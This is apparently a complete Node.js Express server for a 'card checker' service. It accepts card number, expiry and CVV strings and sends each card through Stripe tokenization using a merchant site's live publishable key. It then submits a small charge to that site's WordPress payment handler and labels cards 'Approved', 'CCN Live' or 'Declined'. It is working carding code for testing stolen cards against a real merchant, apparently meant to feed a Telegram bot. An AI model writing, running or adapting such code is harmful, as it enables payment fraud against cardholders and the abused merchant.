import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';

const app = express();
app.use(cors());
app.use(express.json());

async function getBinInfo(bin) {
  try {
    const response = await fetch(`https://lookup.binlist.net/${bin}`);
    if (!response.ok) {
      throw new Error('BIN lookup failed');
    }
    const data = await response.json();
    return {
      scheme: data.scheme || 'Unknown',
      type: data.type || 'Unknown',
      brand: data.brand || data.scheme || 'Unknown',
      country: data.country?.name || 'Unknown',
      bank: data.bank?.name || 'Unknown'
    };
  } catch (error) {
    console.error('BIN lookup error:', error);
    return null;
  }
}

async function checkStripe(card) {
  const [cc, month, year, cvv] = card.split('|');

  // Generate random values for request
  const guid = Math.random().toString(36).substring(2) + Date.now().toString(36);
  const muid = Math.random().toString(36).substring(2) + Date.now().toString(36);
  const sid = Math.random().toString(36).substring(2) + Date.now().toString(36);

  try {
    // First request to get token
    const tokenResponse = await fetch('https://api.stripe.com/v1/tokens', {
      method: 'POST',
      headers: {
        'Authority': 'api.stripe.com',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
      },
      body: new URLSearchParams({
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/v3',
        'time_on_page': '60000',
        'referrer': 'https://expose-news.com/',
        'key': 'pk_live_51I7OeOCA4eWk916cnT490PEfhmYY4ybN9DztEGLGOE9axRZf8hAVGq69SRkzb9bqzku6iBiZ2B8T3Al2JRQN2w0M00Byeg1aWQ',
        'card[number]': cc,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv
      })
    });

    const tokenText = await tokenResponse.text();
    
    // Check if response is HTML
    if (tokenText.trim().toLowerCase().startsWith('<!doctype') || 
        tokenText.trim().toLowerCase().startsWith('<html')) {
      return {
        success: false,
        message: 'Service temporarily unavailable',
        details: 'Gateway error',
        rawResponse: 'Gateway returned an error page'
      };
    }

    let tokenData;
    try {
      tokenData = JSON.parse(tokenText);
    } catch (e) {
      return {
        success: false,
        message: 'Invalid response from server',
        details: 'Could not process gateway response',
        rawResponse: tokenText.substring(0, 200)
      };
    }

    if (tokenData.error) {
      return {
        success: false,
        message: tokenData.error.message,
        details: null,
        rawResponse: tokenText
      };
    }

    if (!tokenData.id) {
      return {
        success: false,
        message: 'Invalid token response',
        details: 'Token ID not found in response',
        rawResponse: tokenText
      };
    }

    // Second request to confirm payment
    const confirmResponse = await fetch('https://expose-news.com/wp-admin/admin-ajax.php', {
      method: 'POST',
      headers: {
        'Authority': 'expose-news.com',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://expose-news.com',
        'Referer': 'https://expose-news.com/asp-payment-box/?product_id=253886',
        'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Cookie': `asp_transient_id=${guid}; __stripe_mid=${muid}; __stripe_sid=${sid}`
      },
      body: new URLSearchParams({
        'action': 'asp_pp_confirm_token',
        'asp_token_id': tokenData.id,
        'product_id': '253886',
        'currency': 'GBP',
        'amount': '300',
        'billing_details': JSON.stringify({
          name: 'John Smith',
          email: 'customer@example.com'
        }),
        'token': '17ee9fd08790aae23bcab975db75e813'
      })
    });

    const confirmText = await confirmResponse.text();
    
    // Check if confirm response is HTML
    if (confirmText.trim().toLowerCase().startsWith('<!doctype') || 
        confirmText.trim().toLowerCase().startsWith('<html')) {
      return {
        success: false,
        message: 'Service temporarily unavailable',
        details: 'Gateway error',
        rawResponse: 'Gateway returned an error page'
      };
    }

    let confirmData;
    try {
      confirmData = JSON.parse(confirmText);
    } catch (e) {
      let errorMessage = 'Invalid response from server';
      if (confirmText.includes('error')) {
        const errorMatch = confirmText.match(/error["\s:]+([^"}\s]+)/i);
        if (errorMatch) {
          errorMessage = errorMatch[1];
        }
      }
      
      return {
        success: false,
        message: errorMessage,
        details: 'Could not process gateway response',
        rawResponse: confirmText.substring(0, 200)
      };
    }

    let response = {
      success: false,
      message: 'Card Declined',
      details: null,
      rawResponse: confirmText
    };

    if (confirmData.success) {
      response.success = true;
      response.message = 'Card Approved';
      response.details = 'AUTH DONE 3$';
    } else if (confirmData.error) {
      if (typeof confirmData.error === 'string') {
        if (confirmData.error.includes('security code')) {
          response.success = true;
          response.message = 'CCN Live';
          response.details = 'Invalid Security Code';
        } else if (confirmData.error.includes('insufficient_funds')) {
          response.success = true;
          response.message = 'Card Approved';
          response.details = 'Insufficient Funds';
        } else if (confirmData.error.includes('card_declined')) {
          response.message = 'Card Declined';
        } else {
          response.message = confirmData.error;
        }
      }
    }

    return response;
  } catch (error) {
    return {
      success: false,
      message: 'Check failed',
      details: error.message,
      rawResponse: error.toString()
    };
  }
}

app.get('/', (req, res) => {
  res.json({ status: 'API is running' });
});

app.post('/check', async (req, res) => {
  try {
    const { card, telegramId } = req.body;
    const [cc, month, year, cvv] = card.split('|');

    if (!cc || !month || !year || !cvv) {
      return res.json({
        success: false,
        message: 'Invalid card format'
      });
    }

    // Get BIN info
    const binInfo = await getBinInfo(cc.slice(0, 6));

    // Check card with Stripe
    const result = await checkStripe(card);

    // Add BIN info to response if available
    if (binInfo) {
      result.details = result.details 
        ? `${result.details} | ${binInfo.scheme} - ${binInfo.type} - ${binInfo.country}`
        : `${binInfo.scheme} - ${binInfo.type} - ${binInfo.country}`;
    }

    res.json(result);
  } catch (error) {
    console.error('Check error:', error);
    res.json({
      success: false,
      message: 'Check failed',
      details: error.message,
      rawResponse: error.toString()
    });
  }
});

const port = process.env.PORT || 3001;
app.listen(port, () => {
  console.log(`Card checker API running on port ${port}`);
});